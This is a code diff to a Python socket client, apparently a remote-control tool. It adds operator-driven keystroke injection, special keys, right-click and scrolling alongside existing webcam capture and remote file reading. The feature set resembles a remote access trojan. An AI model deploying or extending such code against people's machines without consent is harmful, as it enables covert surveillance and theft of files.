@@ -99,7 +99,26 @@ def start_client():
 
             elif command.startswith("type"):
                 text = command.split(" ", 1)[1]
-                pyautogui.write(text)
+                specials = {
+                    "[enter]": "enter",
+                    "\b": "backspace",
+                    "\t": "tab",
+                    "[esc]": "esc",
+                    "[delete]": "delete",
+                    "[capslock]": "capslock",
+                    "[ctrl]": "ctrl",
+                    "[alt]": "alt",
+                    "[shift]": "shift",
+                    "[left]": "left",
+                    "[right]": "right",
+                    "[up]": "up",
+                    "[down]": "down"
+                }
+                if text in specials:
+                    pyautogui.press(specials[text])
+                else:
+                    pyautogui.write(text)
+
 
             elif command == "webcam":
                 img = webcam.capture_webcam()
@@ -117,6 +136,23 @@ def start_client():
                 path = command.split(" ", 1)[1] if " " in command else ""
                 result = file_manager.read_file(path)
                 send_base64(s_cmd, result)
+
+            elif command == "right_click":
+                pyautogui.click(button="right")
+
+            elif command.startswith("type_special"):
+                key = command.split(" ", 1)[1].strip("[]").lower()
+                try:
+                    pyautogui.press(key)
+                except Exception as e:
+                    print(f"[client] Erreur touche spéciale : {key} -> {e}")
+
+            elif command.startswith("scroll"):
+                try:
+                    delta = int(command.split(" ")[1])
+                    pyautogui.scroll(delta)
+                except:
+                    pass
 
             elif command == "exit":
                 s_cmd.close()
